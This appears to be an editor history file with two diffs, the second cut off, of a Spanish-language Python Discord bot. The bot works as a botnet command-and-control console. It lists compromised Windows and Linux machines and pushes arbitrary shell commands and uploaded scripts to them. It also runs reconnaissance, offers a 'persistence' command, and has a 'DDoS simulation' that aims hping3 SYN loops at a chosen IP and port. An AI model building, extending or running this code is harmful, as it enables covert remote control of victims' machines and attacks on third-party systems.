\"Desconocido\")\r\n+                response += f\"Bot {bot_ids[bot_conn]} ({so.capitalize()}): {bot_conn.getpeername()}\\n\"\r\n+        else:\r\n+            response = \"No hay bots conectados.\"\r\n+        await ctx.send(response)\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al listar bots: {e}\")\r\n+        await ctx.send(\"Error al listar bots.\")\r\n+\r\n+@bot.command(name='enviar_comando')\r\n+async def enviar_comando_command(ctx, comando_windows: str, comando_linux: str):\r\n+    \"\"\"\r\n+    Comando de Discord para enviar un comando a los bots conectados.\r\n+    \"\"\"\r\n+    try:\r\n+        enviar_comando(comando_windows, comando_linux)\r\n+        await ctx.send(\"Comando enviado a los bots seleccionados.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+        await ctx.send(\"Error al enviar comando.\")\r\n+\r\n+@bot.command(name='cerrar_conexion')\r\n+async def cerrar_conexion_command(ctx, bot_id: int):\r\n+    \"\"\"\r\n+    Comando de Discord para cerrar la conexión con un bot específico.\r\n+    \"\"\"\r\n+    try:\r\n+        cerrar_conexion_bots(bot_id)\r\n+        await ctx.send(f\"Conexión con el bot {bot_id} cerrada.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\r\n+        await ctx.send(f\"Error al cerrar conexión con el bot {bot_id}.\")\r\n+\r\n+@bot.command(name='menu_comandos')\r\n+async def menu_comandos_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para mostrar el menú de comandos.\r\n+    \"\"\"\r\n+    try:\r\n+        await ctx.send(\"Seleccione el tipo de comandos:\\n1. Comandos básicos\\n2. Comandos avanzados\")\r\n+        tipo_comando = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+        tipo_comando = tipo_comando.content.strip()\r\n+\r\n+        if tipo_comando == \"1\":\r\n+            await ctx.send(\"Comandos básicos disponibles:\\n1. Obtener información del sistema\\n2. Consultar conexiones de red\\n3. Ver procesos en ejecución\\n4. Listar archivos en el directorio actual\\n5. Obtener la IP pública\")\r\n+            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+            orden = orden.content.strip()\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                comando_windows = \"systeminfo\"\r\n+                comando_linux = \"uname -a && lsb_release -a\"\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"netstat -ano\"\r\n+                comando_linux = \"netstat -tunapl\"\r\n+            elif orden == \"3\":\r\n+                comando_windows = \"tasklist\"\r\n+                comando_linux = \"ps aux\"\r\n+            elif orden == \"4\":\r\n+                comando_windows = \"dir\"\r\n+                comando_linux = \"ls -lah\"\r\n+            elif orden == \"5\":\r\n+                comando_windows = \"curl ifconfig.me\"\r\n+                comando_linux = \"curl ifconfig.me\"\r\n+            else:\r\n+                await ctx.send(\"Opción no válida.\")\r\n+                return\r\n+\r\n+            enviar_comando(comando_windows, comando_linux)\r\n+\r\n+        elif tipo_comando == \"2\":\r\n+            await ctx.send(\"Comandos avanzados disponibles:\\n1. Simular ataque DDoS\\n2. Detener simulación de DDoS\\n3. Ejecutar un comando personalizado\\n4. Ejecutar un script remoto\\n5. Intentar asegurar la persistencia\")\r\n+            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+            orden = orden.content.strip()\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                await ctx.send(\"Ingrese la dirección IP del objetivo:\")\r\n+                objetivo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                objetivo = objetivo.content.strip()\r\n+                await ctx.send(\"Ingrese el puerto del objetivo:\")\r\n+                puerto = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                puerto = puerto.content.strip()\r\n+                await ctx.send(\"Ingrese el protocolo (TCP/UDP):\")\r\n+                protocolo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                protocolo = protocolo.content.strip().upper()\r\n+                if protocolo not in [\"TCP\", \"UDP\"]:\r\n+                    await ctx.send(\"Protocolo no válido.\")\r\n+                    return\r\n+                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n+                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"stop_ddos\"\r\n+                comando_linux = \"stop_ddos\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n+            elif orden == \"3\":\r\n+                await ctx.send(\"Ingrese el comando personalizado para Windows:\")\r\n+                comando_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                comando_windows = comando_windows.content.strip()\r\n+                await ctx.send(\"Ingrese el comando personalizado para Linux:\")\r\n+                comando_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                comando_linux = comando_linux.content.strip()\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"4\":\r\n+                await ctx.send(\"Seleccione el tipo de script:\\n1. Python\\n2. Bash\\n3. Otro (especificar)\")\r\n+                tipo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                tipo = tipo.content.strip()\r\n+\r\n+                if tipo == \"1\":\r\n+                    extension = \"py\"\r\n+                    interprete_linux = \"python3 -c\"\r\n+                    interprete_windows = \"python -c\"\r\n+                elif tipo == \"2\":\r\n+                    extension = \"sh\"\r\n+                    interprete_linux = \"bash -c\"\r\n+                    interprete_windows = \"powershell -Command\"\r\n+                elif tipo == \"3\":\r\n+                    await ctx.send(\"Ingrese la extensión del script (ejemplo: ps1, rb, pl):\")\r\n+                    extension = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    extension = extension.content.strip()\r\n+                    await ctx.send(\"Ingrese el comando para ejecutarlo en Linux:\")\r\n+                    interprete_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    interprete_linux = interprete_linux.content.strip()\r\n+                    await ctx.send(\"Ingrese el comando para ejecutarlo en Windows:\")\r\n+                    interprete_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    interprete_windows = interprete_windows.content.strip()\r\n+                else:\r\n+                    await ctx.send(\"Opción inválida.\")\r\n+                    return\r\n+\r\n+                await ctx.send(\"¿Cómo desea proporcionar el script?\\n1. Escribirlo aquí\\n2. Proporcionar la ruta de un archivo\")\r\n+                metodo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                metodo = metodo.content.strip()\r\n+\r\n+                if metodo == \"1\":\r\n+                    await ctx.send(f\"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:\")\r\n+                    lineas = []\r\n+                    while True:\r\n+                        linea = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                        linea = linea.content.strip()\r\n+                        if linea.upper() == \"EOF\":  # Detectar EOF\r\n+                            break\r\n+                        lineas.append(linea)\r\n+                    script = \"\\n\".join(lineas)  # Unir líneas en una sola cadena\r\n+                elif metodo == \"2\":\r\n+                    await ctx.send(\"Ingrese la ruta del archivo:\")\r\n+                    ruta = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    ruta = ruta.content.strip()\r\n+                    try:\r\n+                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n+                            script = archivo.read()\r\n+                    except Exception as e:\r\n+                        await ctx.send(f\"Error al leer el archivo: {e}\")\r\n+                        return\r\n+                else:\r\n+                    await ctx.send(\"Opción inválida.\")\r\n+                    return\r\n+\r\n+                # Reemplazar comillas para evitar problemas con la ejecución remota\r\n+                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n+\r\n+                comando_windows = f'{interprete_windows} \"{script}\"'\r\n+                comando_linux = f\"{interprete_linux} '{script}'\"\r\n+\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"5\":\r\n+                await ctx.send(\"Intentando asegurar la persistencia en los bots seleccionados...\")\r\n+                comando_windows = \"persistencia\"\r\n+                comando_linux = \"persistencia\"\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            else:\r\n+                await ctx.send(\"Opción no válida.\")\r\n+                return\r\n+        else:\r\n+            await ctx.send(\"Opción no válida.\")\r\n+            return\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el menú de comandos: {e}\")\r\n+        await ctx.send(\"Error en el menú de comandos.\")\r\n+\r\n+@bot.command(name='ayuda')\r\n+async def ayuda_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para mostrar la ayuda del bot.\r\n+    \"\"\"\r\n+    help_text = \"\"\"\r\n+    **Comandos disponibles:**\r\n+\r\n+    **!listar_bots**\r\n+    - Lista los bots conectados al servidor.\r\n+\r\n+    **!enviar_comando <comando_windows> <comando_linux>**\r\n+    - Envía un comando a los bots conectados.\r\n+    - Ejemplo: `!enviar_comando \"dir\" \"ls -lah\"`\r\n+\r\n+    **!cerrar_conexion <bot_id>**\r\n+    - Cierra la conexión con un bot específico.\r\n+    - Ejemplo: `!cerrar_conexion 1`\r\n+\r\n+    **!menu_comandos**\r\n+    - Muestra el menú de comandos disponibles para ejecutar en los bots conectados.\r\n+\r\n+    **!ayuda**\r\n+    - Muestra este mensaje de ayuda.\r\n+    \"\"\"\r\n+    await ctx.send(help_text)\r\n+\r\n+def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n+    \"\"\"\r\n+    Envía un comando a un conjunto de bots seleccionados.\r\n+\r\n+    :param comando_windows: El comando a enviar a los bots Windows.\r\n+    :type comando_windows: str\r\n+    :param comando_linux: El comando a enviar a los bots Linux.\r\n+    :type comando_linux: str\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Enviando comando a los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        print(\"\\nSeleccione a qué bots enviar el comando:\")\r\n+        print(\"1. Todos los bots\")\r\n+        print(\"2. Solo bots Windows\")\r\n+        print(\"3. Solo bots Linux\")\r\n+        print(\"4. Un bot específico\")\r\n+        print(\"5. Lista de bots específicos\")\r\n+\r\n+        seleccion = input(\"Ingrese su opción: \")\r\n+        bots_seleccionados = []\r\n+\r\n+        if seleccion == \"1\":\r\n+            bots_seleccionados = bots\r\n+        elif seleccion == \"2\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n+        elif seleccion == \"3\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n+        elif seleccion == \"4\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n+                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n+                if bot:\r\n+                    bots_seleccionados.append(bot)\r\n+                else:\r\n+                    print(\"ID de bot no válido.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"ID inválido. Debe ingresar un número.\")\r\n+                return\r\n+        elif seleccion == \"5\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if id.strip().isdigit()]\r\n+                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]\r\n+                if not bots_seleccionados:\r\n+                    print(\"No se encontraron bots con los IDs proporcionados.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"Entrada inválida. Debe ingresar números separados por comas.\")\r\n+                return\r\n+        else:\r\n+            print(\"Opción no válida.\")\r\n+            return\r\n+\r\n+        respuestas = {}\r\n+\r\n+        for bot in bots_seleccionados:\r\n+            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)\r\n+\r\n+        print(\"\\n--- Respuestas de los bots ---\\n\")\r\n+        for bot, respuesta in respuestas.items():\r\n+            bot_info = f\"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})\"\r\n+            print(f\"[→] {bot_info}: {respuesta}\")\r\n+\r\n+        print(\"\\n--- Volviendo al menú principal ---\\n\")\r\n+        time.sleep(2)\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+\r\n+def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):\r\n+    \"\"\"\r\n+    Envía un comando a un bot específico basado en su sistema operativo.\r\n+\r\n+    Determina el sistema operativo del bot y envía el comando adecuado \r\n+    para Windows o Linux. Espera una respuesta del bot por un tiempo \r\n+    máximo definido y devuelve la respuesta si se recibe. Maneja la \r\n+    desconexión del bot si ocurre durante la comunicación.\r\n+\r\n+    :param bot: El socket del bot al que se enviará el comando.\r\n+    :param comando_windows: El comando a ejecutar si el bot es Windows.\r\n+    :param comando_linux: El comando a ejecutar si el bot es Linux.\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    :return: La respuesta del bot o un mensaje de error si no se recibe \r\n+             respuesta o si el bot se desconecta.\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(f\"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}\")\r\n+        so = sistemas_operativos.get(bot, \"desconocido\")\r\n+        comando = comando_windows if so == \"windows\" else comando_linux\r\n+        bot_id = bot_ids.get(bot, \"Desconocido\")\r\n+\r\n+        try:\r\n+            bot.send(comando.encode('utf-8'))\r\n+            print(f\"\\n[✓] Orden enviada a bot {bot_id} ({so.capitalize()})\\n\")\r\n+\r\n+            # Esperar hasta que `manejar_bot()` almacene la respuesta\r\n+            tiempo_maximo = 5  # Segundos\r\n+            tiempo_inicial = time.time()\r\n+\r\n+            while time.time() - tiempo_inicial < tiempo_maximo:\r\n+                if bot_id in respuestas_bots:\r\n+                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta\r\n+                    if tipo_comando == \"ddos_start\":\r\n+                        ddos_status[bot_id] = \"running\"\r\n+                    elif tipo_comando == \"ddos_stop\":\r\n+                        ddos_status[bot_id] = \"stopped\"\r\n+                    print(f\"\\n--- Respuesta del Bot {bot_id} ---\\n{respuesta}\\n\")\r\n+                    return respuesta if respuesta else \"[INFO] Comando ejecutado sin salida\"\r\n+                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente\r\n+\r\n+            return \"[ERROR] No hubo respuesta del bot (Timeout)\"\r\n+\r\n+        except (socket.error, BrokenPipeError):\r\n+            print(f\"[✗] Bot {bot_id} desconectado.\")\r\n+            if bot in bots:\r\n+                bots.remove(bot)\r\n+            if bot in bot_ids:\r\n+                del bot_ids[bot]\r\n+            if bot in sistemas_operativos:\r\n+                del sistemas_operativos[bot]\r\n+            return \"[ERROR] El bot se ha desconectado.\"\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}\")\r\n+\r\n+def cerrar_conexion_bots(bot_id):\r\n+    \"\"\"\r\n+    Cierra la conexión con un bot seleccionado por el usuario.\r\n+    \r\n+    El usuario puede seleccionar a los bots a los que quiere cerrar la conexión\r\n+    mediante un ID o bien escribir \"todos\" para cerrar la conexión con todos\r\n+    los bots conectados.\r\n+    \r\n+    :param bot_id: El ID del bot cuya conexión se desea cerrar.\r\n+    :type bot_id: int\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Cerrando conexión con los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)  # Buscar el bot con el ID correspondiente\r\n+        \r\n+        if not bot:  # Si no se encuentra el bot\r\n+            print(f\"ID de bot {bot_id} no válido.\")  # Imprimir un mensaje de error\r\n+            return\r\n+\r\n+        try:\r\n+            bot.close()  # Cerrar la conexión\r\n+            print(f\"Conexión con el bot {bot_id} cerrada.\")  # Imprimir un mensaje de confirmación\r\n+        except Exception as e:\r\n+            print(f\"Error al cerrar la conexión con el bot {bot_id}: {e}\")\r\n+\r\n+        if bot in bots:\r\n+            bots.remove(bot)  # Eliminar el bot de la lista\r\n+\r\n+        if bot in bot_ids:\r\n+            del bot_ids[bot]  # Eliminar el ID del bot\r\n+\r\n+        if bot in sistemas_operativos:\r\n+            del sistemas_operativos[bot]  # Eliminar el SO del bot\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\n\\ No newline at end of file\n"
                },
                {
                    "date": 1740254464287,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,434 @@\n+import discord\r\n+from discord.ext import commands\r\n+import logging\r\n+import configparser\r\n+import os\r\n+import socket\r\n+import subprocess\r\n+import threading\r\n+import time\r\n+\r\n+# Cargar configuración\r\n+config = configparser.ConfigParser()\r\n+config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config_bot.ini\"))\r\n+\r\n+intents = discord.Intents.default()\r\n+intents.message_content = True\r\n+bot = commands.Bot(command_prefix='!', intents=intents)\r\n+\r\n+# Variables globales\r\n+bots = []  # Lista de bots conectados\r\n+bot_ids = {}  # Diccionario con los IDs de los bots\r\n+sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot\r\n+respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots\r\n+\r\n+@bot.event\r\n+async def on_ready():\r\n+    logging.info(f'Bot conectado como {bot.user}')\r\n+    print(f'Bot conectado como {bot.user}')\r\n+\r\n+@bot.command(name='listar_bots')\r\n+async def listar_bots_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para listar los bots conectados.\r\n+    \"\"\"\r\n+    try:\r\n+        if bots:\r\n+            response = \"\\nBots conectados:\\n\"\r\n+            for bot_conn in bots:\r\n+                so = sistemas_operativos.get(bot_conn, \"Desconocido\")\r\n+                response += f\"Bot {bot_ids[bot_conn]} ({so.capitalize()}): {bot_conn.getpeername()}\\n\"\r\n+        else:\r\n+            response = \"No hay bots conectados.\"\r\n+        await ctx.send(response)\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al listar bots: {e}\")\r\n+        await ctx.send(\"Error al listar bots.\")\r\n+\r\n+@bot.command(name='enviar_comando')\r\n+async def enviar_comando_command(ctx, comando_windows: str, comando_linux: str):\r\n+    \"\"\"\r\n+    Comando de Discord para enviar un comando a los bots conectados.\r\n+    \"\"\"\r\n+    try:\r\n+        enviar_comando(comando_windows, comando_linux)\r\n+        await ctx.send(\"Comando enviado a los bots seleccionados.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al enviar comando: {e}\")\r\n+        await ctx.send(\"Error al enviar comando.\")\r\n+\r\n+@bot.command(name='cerrar_conexion')\r\n+async def cerrar_conexion_command(ctx, bot_id: int):\r\n+    \"\"\"\r\n+    Comando de Discord para cerrar la conexión con un bot específico.\r\n+    \"\"\"\r\n+    try:\r\n+        cerrar_conexion_bots(bot_id)\r\n+        await ctx.send(f\"Conexión con el bot {bot_id} cerrada.\")\r\n+    except Exception as e:\r\n+        logging.error(f\"Error al cerrar conexión con el bot {bot_id}: {e}\")\r\n+        await ctx.send(f\"Error al cerrar conexión con el bot {bot_id}.\")\r\n+\r\n+@bot.command(name='menu_comandos')\r\n+async def menu_comandos_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para mostrar el menú de comandos.\r\n+    \"\"\"\r\n+    try:\r\n+        await ctx.send(\"Seleccione el tipo de comandos:\\n1. Comandos básicos\\n2. Comandos avanzados\")\r\n+        tipo_comando = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+        tipo_comando = tipo_comando.content.strip()\r\n+\r\n+        if tipo_comando == \"1\":\r\n+            await ctx.send(\"Comandos básicos disponibles:\\n1. Obtener información del sistema\\n2. Consultar conexiones de red\\n3. Ver procesos en ejecución\\n4. Listar archivos en el directorio actual\\n5. Obtener la IP pública\")\r\n+            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+            orden = orden.content.strip()\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                comando_windows = \"systeminfo\"\r\n+                comando_linux = \"uname -a && lsb_release -a\"\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"netstat -ano\"\r\n+                comando_linux = \"netstat -tunapl\"\r\n+            elif orden == \"3\":\r\n+                comando_windows = \"tasklist\"\r\n+                comando_linux = \"ps aux\"\r\n+            elif orden == \"4\":\r\n+                comando_windows = \"dir\"\r\n+                comando_linux = \"ls -lah\"\r\n+            elif orden == \"5\":\r\n+                comando_windows = \"curl ifconfig.me\"\r\n+                comando_linux = \"curl ifconfig.me\"\r\n+            else:\r\n+                await ctx.send(\"Opción no válida.\")\r\n+                return\r\n+\r\n+            enviar_comando(comando_windows, comando_linux)\r\n+\r\n+        elif tipo_comando == \"2\":\r\n+            await ctx.send(\"Comandos avanzados disponibles:\\n1. Simular ataque DDoS\\n2. Detener simulación de DDoS\\n3. Ejecutar un comando personalizado\\n4. Ejecutar un script remoto\\n5. Intentar asegurar la persistencia\")\r\n+            orden = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+            orden = orden.content.strip()\r\n+            comando_windows = \"\"\r\n+            comando_linux = \"\"\r\n+\r\n+            if orden == \"1\":\r\n+                await ctx.send(\"Ingrese la dirección IP del objetivo:\")\r\n+                objetivo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                objetivo = objetivo.content.strip()\r\n+                await ctx.send(\"Ingrese el puerto del objetivo:\")\r\n+                puerto = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                puerto = puerto.content.strip()\r\n+                await ctx.send(\"Ingrese el protocolo (TCP/UDP):\")\r\n+                protocolo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                protocolo = protocolo.content.strip().upper()\r\n+                if protocolo not in [\"TCP\", \"UDP\"]:\r\n+                    await ctx.send(\"Protocolo no válido.\")\r\n+                    return\r\n+                comando_windows = f\"powershell -Command \\\"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\\\"\"\r\n+                comando_linux = f\"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_start\")\r\n+            elif orden == \"2\":\r\n+                comando_windows = \"stop_ddos\"\r\n+                comando_linux = \"stop_ddos\"\r\n+                enviar_comando(comando_windows, comando_linux, \"ddos_stop\")\r\n+            elif orden == \"3\":\r\n+                await ctx.send(\"Ingrese el comando personalizado para Windows:\")\r\n+                comando_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                comando_windows = comando_windows.content.strip()\r\n+                await ctx.send(\"Ingrese el comando personalizado para Linux:\")\r\n+                comando_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                comando_linux = comando_linux.content.strip()\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"4\":\r\n+                await ctx.send(\"Seleccione el tipo de script:\\n1. Python\\n2. Bash\\n3. Otro (especificar)\")\r\n+                tipo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                tipo = tipo.content.strip()\r\n+\r\n+                if tipo == \"1\":\r\n+                    extension = \"py\"\r\n+                    interprete_linux = \"python3 -c\"\r\n+                    interprete_windows = \"python -c\"\r\n+                elif tipo == \"2\":\r\n+                    extension = \"sh\"\r\n+                    interprete_linux = \"bash -c\"\r\n+                    interprete_windows = \"powershell -Command\"\r\n+                elif tipo == \"3\":\r\n+                    await ctx.send(\"Ingrese la extensión del script (ejemplo: ps1, rb, pl):\")\r\n+                    extension = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    extension = extension.content.strip()\r\n+                    await ctx.send(\"Ingrese el comando para ejecutarlo en Linux:\")\r\n+                    interprete_linux = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    interprete_linux = interprete_linux.content.strip()\r\n+                    await ctx.send(\"Ingrese el comando para ejecutarlo en Windows:\")\r\n+                    interprete_windows = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    interprete_windows = interprete_windows.content.strip()\r\n+                else:\r\n+                    await ctx.send(\"Opción inválida.\")\r\n+                    return\r\n+\r\n+                await ctx.send(\"¿Cómo desea proporcionar el script?\\n1. Escribirlo aquí\\n2. Proporcionar la ruta de un archivo\")\r\n+                metodo = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                metodo = metodo.content.strip()\r\n+\r\n+                if metodo == \"1\":\r\n+                    await ctx.send(f\"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:\")\r\n+                    lineas = []\r\n+                    while True:\r\n+                        linea = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                        linea = linea.content.strip()\r\n+                        if linea.upper() == \"EOF\":  # Detectar EOF\r\n+                            break\r\n+                        lineas.append(linea)\r\n+                    script = \"\\n\".join(lineas)  # Unir líneas en una sola cadena\r\n+                elif metodo == \"2\":\r\n+                    await ctx.send(\"Ingrese la ruta del archivo:\")\r\n+                    ruta = await bot.wait_for('message', check=lambda message: message.author == ctx.author)\r\n+                    ruta = ruta.content.strip()\r\n+                    try:\r\n+                        with open(ruta, \"r\", encoding=\"utf-8\") as archivo:\r\n+                            script = archivo.read()\r\n+                    except Exception as e:\r\n+                        await ctx.send(f\"Error al leer el archivo: {e}\")\r\n+                        return\r\n+                else:\r\n+                    await ctx.send(\"Opción inválida.\")\r\n+                    return\r\n+\r\n+                # Reemplazar comillas para evitar problemas con la ejecución remota\r\n+                script = script.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\r\n+\r\n+                comando_windows = f'{interprete_windows} \"{script}\"'\r\n+                comando_linux = f\"{interprete_linux} '{script}'\"\r\n+\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            elif orden == \"5\":\r\n+                await ctx.send(\"Intentando asegurar la persistencia en los bots seleccionados...\")\r\n+                comando_windows = \"persistencia\"\r\n+                comando_linux = \"persistencia\"\r\n+                enviar_comando(comando_windows, comando_linux)\r\n+            else:\r\n+                await ctx.send(\"Opción no válida.\")\r\n+                return\r\n+        else:\r\n+            await ctx.send(\"Opción no válida.\")\r\n+            return\r\n+    except Exception as e:\r\n+        logging.error(f\"Error en el menú de comandos: {e}\")\r\n+        await ctx.send(\"Error en el menú de comandos.\")\r\n+\r\n+@bot.command(name='ayuda')\r\n+async def ayuda_command(ctx):\r\n+    \"\"\"\r\n+    Comando de Discord para mostrar la ayuda del bot.\r\n+    \"\"\"\r\n+    help_text = \"\"\"\r\n+    **Comandos disponibles:**\r\n+\r\n+    **!listar_bots**\r\n+    - Lista los bots conectados al servidor.\r\n+\r\n+    **!enviar_comando <comando_windows> <comando_linux>**\r\n+    - Envía un comando a los bots conectados.\r\n+    - Ejemplo: `!enviar_comando \"dir\" \"ls -lah\"`\r\n+\r\n+    **!cerrar_conexion <bot_id>**\r\n+    - Cierra la conexión con un bot específico.\r\n+    - Ejemplo: `!cerrar_conexion 1`\r\n+\r\n+    **!menu_comandos**\r\n+    - Muestra el menú de comandos disponibles para ejecutar en los bots conectados.\r\n+\r\n+    **!ayuda**\r\n+    - Muestra este mensaje de ayuda.\r\n+    \"\"\"\r\n+    await ctx.send(help_text)\r\n+\r\n+def enviar_comando(comando_windows, comando_linux, tipo_comando=None):\r\n+    \"\"\"\r\n+    Envía un comando a un conjunto de bots seleccionados.\r\n+\r\n+    :param comando_windows: El comando a enviar a los bots Windows.\r\n+    :type comando_windows: str\r\n+    :param comando_linux: El comando a enviar a los bots Linux.\r\n+    :type comando_linux: str\r\n+    :param tipo_comando: El tipo de comando a enviar (opcional).\r\n+    :type tipo_comando: str\r\n+    \"\"\"\r\n+    try:\r\n+        logging.info(\"Enviando comando a los bots seleccionados\")\r\n+        if not bots:\r\n+            print(\"No hay bots conectados.\")\r\n+            return\r\n+\r\n+        print(\"\\nSeleccione a qué bots enviar el comando:\")\r\n+        print(\"1. Todos los bots\")\r\n+        print(\"2. Solo bots Windows\")\r\n+        print(\"3. Solo bots Linux\")\r\n+        print(\"4. Un bot específico\")\r\n+        print(\"5. Lista de bots específicos\")\r\n+\r\n+        seleccion = input(\"Ingrese su opción: \")\r\n+        bots_seleccionados = []\r\n+\r\n+        if seleccion == \"1\":\r\n+            bots_seleccionados = bots\r\n+        elif seleccion == \"2\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"windows\"]\r\n+        elif seleccion == \"3\":\r\n+            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == \"linux\"]\r\n+        elif seleccion == \"4\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_id = int(input(\"Ingrese el ID del bot: \"))\r\n+                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)\r\n+                if bot:\r\n+                    bots_seleccionados.append(bot)\r\n+                else:\r\n+                    print(\"ID de bot no válido.\")\r\n+                    return\r\n+            except ValueError:\r\n+                print(\"ID inválido. Debe ingresar un número.\")\r\n+                return\r\n+        elif seleccion == \"5\":\r\n+            listar_bots()\r\n+            try:\r\n+                bot_ids_seleccionados = [int(id.strip()) for id in input(\"Ingrese los IDs de los bots separados por comas: \").split(\",\") if 